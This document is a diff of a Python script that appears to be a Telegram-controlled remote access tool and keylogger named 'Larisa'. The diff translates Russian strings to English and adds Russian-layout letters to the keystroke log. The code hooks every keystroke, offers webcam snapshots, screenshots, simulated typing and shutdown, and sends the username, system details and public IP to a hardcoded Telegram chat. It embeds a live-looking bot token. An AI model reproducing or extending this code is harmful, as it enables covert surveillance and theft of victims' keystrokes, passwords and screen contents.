@@ -1,17 +1,7 @@
 chat_user_id = 496266339
 ######################
-#2.2 08.11.2021
-#i+url - open image and user can not close it
-#close - close image
-#2
-#
-#1.99.3 0.3/11/2021 04:00
-#help out start messenge
-#last 1.99.2
-# add strat messenge
-#last 1.99
-#в этой версии добавлена возможность обновлять бота с сервера 
-#при вводе команды update бот установленый вайлом setup скачает себя с сервера и установит
+#added russian keyboard to log
+#removed russian text from code and comments
 ######################
 bot_token = '2060724050:AAFf56IHazMb7OulkyKyxbxznySQX20jWU8'
 import subprocess
@@ -61,7 +51,7 @@ import requests
 #import base64
 
 log = ''
-help_text = 'Вeрсия '+versi+' Ник '+USER_NAME+' \n \nhelp - help \ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut'
+help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
 
 #close the programm 
 #NEEDS TESTING
@@ -142,7 +132,7 @@ def message_handler(update: Update, context: CallbackContext):
 		conn = http.client.HTTPConnection("ifconfig.me")
 		conn.request("GET", "/ip")
 		
-		status='Пользователь: '+USER_NAME+' Версия os '+str(subprocess.check_output('ver', shell=True))+' всего RAM: '+str(mem_total)+' использовано: '+str(mem_use)+'ip адрес, udp port '+str(conn.getresponse().read())
+		status='User: '+USER_NAME+' Os version '+str(subprocess.check_output('ver', shell=True))+' total RAM: '+str(mem_total)+' used: '+str(mem_use)+'ip adress, udp port '+str(conn.getresponse().read())
 		bot.send_message(chat_id=chat_user_id, text=str(status) )
 def open_image(text):
 	num = 96
@@ -274,9 +264,14 @@ def start_key():
 	keyboard.on_release(callback=callback)
 	keyboard.wait()
 
+diction = {'q':'q (й)', 'w':'w (ц)', 'e':'e (у)', 'r':'r (к)', 't':'t (е)', 'y':'y (н)', 'u':'u (г)', 'i':'i (ш)', 'o':'o (щ)', 'p':'p (з)', '[':'[ (х)', ']':'] (ъ)', 'a':'a (ф)', 's':'s (ы)', 'd':'d (в)', 'f':'f (а)', 'g':'g (п)', 'h':'h (р)', 'j':'j (о)', 'k':'k (л)', 'l':'l (д)', ';':'; (ж)', 'z':'z (я)', 'x':'x (ч)', 'c':'c (с)', 'v':'v (м)', 'b':'b (и)', 'n':'n (т)', 'm':'m (ь)', ',':', (б)', '.':'. (ю)'}
 def callback(event):
-	global log
-	log += str(datetime.now()) + ' ' + str(event.name) + '\n'
+	global log, diction
+	tmp = diction.get(event.name)
+	if tmp!=None:
+		log += str(datetime.now()) + ' ' + str(tmp) + '\n'
+	else:
+		log += str(datetime.now()) + ' ' + str(event.name) + '\n'
 
 bot = telegram.Bot(token=bot_token)
 updater = Updater(token = bot_token, use_context = True)
@@ -290,7 +285,7 @@ b.start()
 conn = http.client.HTTPConnection("ifconfig.me")
 conn.request("GET", "/ip")
 ipad=conn.getresponse().read()
-startmess = 'лариса версии '+versi+' запущена у пользователя '+USER_NAME+'\n ip адрес '+str(ipad)
+startmess = 'Larisa version '+versi+' launched by '+USER_NAME+'\n ip adress '+str(ipad)
 bot.send_message(chat_id=chat_user_id, text=startmess)
 bot.send_message(chat_id=chat_user_id, text=str(__file__))
 scr()
